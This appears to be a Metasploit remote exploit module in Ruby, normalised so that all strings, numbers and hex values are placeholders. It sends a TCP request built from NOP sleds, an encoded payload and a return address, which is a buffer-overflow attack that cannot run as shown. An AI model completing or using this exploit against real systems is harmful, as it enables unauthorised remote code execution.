require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self ) end def exploit connect sock . get_once req_uno = [ <hex> ] . pack ( <str> ) req_dos = [ <hex> ] . pack ( <str> ) + [ <hex> ] . pack ( <str> ) req_dos << [ <hex> ] . pack ( <str> ) + [ <hex> ] . pack ( <str> ) req_dos << [ <hex> ] . pack ( <str> ) + [ <hex> ] . pack ( <str> ) req_dos << [ <hex> ] . pack ( <str> ) + [ <hex> ] . pack ( <str> ) req_dos << [ <hex> ] . pack ( <str> ) + [ <hex> ] . pack ( <str> ) req_dos << <str> + rand_text_alphanumeric ( <int> - payload . encoded . length ) req_dos << make_nops ( <int> ) + payload . encoded + [ target . ret ] . pack ( <str> ) req_dos << make_nops ( <int> ) + [ <hex> , - <int> ] . pack ( <str> ) + rand_text_alphanumeric ( <int> ) print_status ( <str> target . name <str> ) sock . put ( req_uno ) sock . put ( req_dos ) handler disconnect end end 
